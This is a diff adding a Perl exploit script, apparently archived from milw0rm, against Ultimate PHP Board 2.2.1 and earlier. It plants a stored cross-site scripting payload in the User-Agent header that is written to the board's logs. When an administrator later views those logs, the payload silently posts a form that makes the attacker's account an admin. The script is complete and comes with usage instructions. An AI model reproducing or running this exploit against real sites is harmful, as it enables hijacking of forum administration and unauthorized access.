@@ -1,0 +1,92 @@
+#!/usr/bin/perl -w
+# ------------------------------------------------------------------
+# Ultimate PHP Board <= 2.2.1 (log inj) Privilege Escalation Exploit
+# ------------------------------------------------------------------
+# by athos - staker[at]hotmail[dot]it
+# download on http://www.myupb.com/
+# ------------------------------------------------------------------
+# Usage:
+# perl xpl.pl host path id email
+# perl xpl.pl localhost/upb 21 root@r00x.com
+# ------------------------------------------------------------------
+# Note: don't add me on msn messenger
+#       thanks evilsocket 
+#       thanks meh for ajax code
+#       my email staker.38@gmail.com
+# ------------------------------------------------------------------
+
+use strict;
+use IO::Socket;
+
+my ($host,$path,$id,$email) = @ARGV;
+
+
+if (@ARGV != 4) {
+      
+      print "\n+--------------------------------------------------------------------+\r".
+            "\n| Ultimate PHP Board <= 2.2.1 (log inj) Privilege Escalation Exploit |\r".
+            "\n+--------------------------------------------------------------------+\r".
+            "\n(user -> admin xpl )by athos - staker[at]hotmail[dot]it\n".
+            "\nUsage   + perl $0 [host] [path] [ID] [email]".
+            "\nHost    + localhost".
+            "\nPath    + forum path /upb)".
+            "\nID      + your user ID".
+            "\nEmail   + your/any email\n";
+      exit;
+} 
+
+&exploit();
+
+
+sub exploit () {
+
+     my $content = undef;
+     my $uagent  = &logs;
+     my $packet  = undef;
+     my $socket  = new IO::Socket::INET(
+                                         PeerAddr => $host,
+                                         PeerPort => 80,
+                                         Proto    => 'tcp',
+                                       ) or die $!;
+                            
+     $packet .= "GET /$path/index.php HTTP/1.1\r\n";
+     $packet .= "Host: $host\r\n";
+     $packet .= "User-Agent: $uagent\r\n";
+     $packet .= "Connection: close\r\n\r\n";
+     
+     $socket->send($packet);
+     
+     while (<$socket>) {
+        $content .= $_;
+     }    
+     
+     if ($content =~ m/myUPB/i) {
+        print "Exploit Done!\n";
+        print "You'll become admin when the real admin will visit the logs\n";
+        exit;
+     }
+     else {
+        print "Exploit Failed!\n";
+        exit;
+    }    
+}                            
+
+
+sub logs () {
+
+my $logs = "Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d".
+           "<script>var xplurl='http://$host/$path/admin_members.php?a".
+           "ction=edit&id=$id&page=10'; var xpldata='a=1&level=3&email".
+           "=$email&status&location&website&avatar&msn&yahoo&icq&sig&u_".
+           "timezone=0&B1=Submit';function s(s){var h=((window.ActiveXO".
+           "bject)?new ActiveXObject('Microsoft.XMLHTTP'):new XMLHttp".
+           "Request());h.open('POST', xplurl, true);h.setRequestHeader".
+           "('Content-type','application/x-www-form-urlencoded');h.setRe".
+           "questHeader('Content-length',xpldata.length);h.setRequestHea".
+           "der('Connection','close');h.send(xpldata);}s();</script>";
+  
+  return $logs;
+           
+}                     
+
+# milw0rm.com [2008-12-29]
